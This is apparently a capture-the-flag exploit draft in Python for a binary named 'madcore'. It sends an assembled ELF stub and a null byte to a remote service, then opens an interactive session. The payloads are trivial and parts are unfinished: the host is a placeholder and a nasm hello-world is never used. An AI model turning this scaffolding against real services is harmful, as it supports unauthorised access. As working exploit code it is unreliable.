#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./madcore')
host = args.HOST or '%s'
port = int(args.PORT or 1337)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

e = ELF.from_assembly('nop; foo: int 0x80', vma = 0)
f=open(e.path, "rb").read()

sl(f)

nasm("""
          global    _start

          section   .text
_start:   mov       rax, 1                  ; system call for write
          mov       rdi, 1                  ; file handle 1 is stdout
          mov       rsi, message            ; address of string to output
          mov       rdx, 13                 ; number of bytes
          syscall                           ; invoke operating system to do the write
          mov       rax, 60                 ; system call for exit
          xor       rdi, rdi                ; exit code 0
          syscall                           ; invoke operating system to exit

          section   .data
message:  db        "Hello, World", 10      ; note the newline at the end
""")

re()
sl(b"\x00")

io.interactive()
